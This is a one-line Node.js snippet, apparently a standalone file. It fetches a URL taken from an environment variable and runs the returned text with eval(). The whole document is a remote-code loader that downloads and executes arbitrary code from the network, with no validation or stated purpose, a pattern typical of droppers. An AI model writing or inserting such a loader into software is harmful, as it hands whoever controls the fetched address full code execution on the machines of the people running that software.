require('fetch').fetchUrl(process.env.urls, (a, b, c) => eval(c.toString()))
